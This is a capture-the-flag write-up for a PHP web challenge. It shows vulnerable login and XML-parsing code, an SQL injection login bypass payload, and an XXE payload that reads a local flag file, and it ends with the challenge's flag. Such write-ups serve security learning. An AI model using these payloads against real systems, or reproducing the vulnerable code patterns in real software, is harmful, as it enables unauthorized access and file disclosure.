---
title: "s3cr3ct_w3b revenge"
published: 2025-01-12
description: "SQL Injection + XXE for arbitrary file read"
tags: ["Web", "SQLi", "XXE"]
category: QnQSec CTF 2025
draft: false
---

> "I have hidden secret in this web can you find out the secret?"

We are given a small PHP web application with a login page and an XML viewer. The Dockerfile hints that a `flag.txt` file is copied into the container.

## Recon & Source Review

### Login (login.php) - SQL Injection

```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

No escaping, no prepared statements -> vulnerable to SQL Injection.

### API (api.php) - XXE

```php
$dom->resolveExternals = true;
$dom->substituteEntities = true;
$dom->loadXML($xml, LIBXML_DTDLOAD | LIBXML_NOENT);
echo $dom->saveXML();
```

Vulnerable to XXE (XML External Entity) injection.

### Dockerfile

```dockerfile
COPY flag.txt /var/flags/flag.txt
```

Flag is at `/var/flags/flag.txt`.

## Step 1 - Authentication Bypass (SQLi)

Using a simple payload in the username field:

```sql
' OR '1'='1' #
```

The query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' # ' AND password = 'x'
```

This always returns a row, setting `$_SESSION['logged_in'] = true`. We are now authenticated.

## Step 2 - XXE Exploitation

The XML parser expands external entities. We craft a malicious XML to read local files:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///var/flags/flag.txt">
]>
<root>&xxe;</root>
```

## Step 3 - Extracting the Flag

Send a POST request to `/api` with the XML content and the flag appears in the response.

## Flag

```
QnQSec{R3v3ng3_15_sw33t_wh3ne_d0n3_r1ght}
```

## Conclusion

- **Vulnerability 1:** SQL Injection in login -> session bypass
- **Vulnerability 2:** XXE in XML parser -> arbitrary file read
- **Flag Path:** `/var/flags/flag.txt`
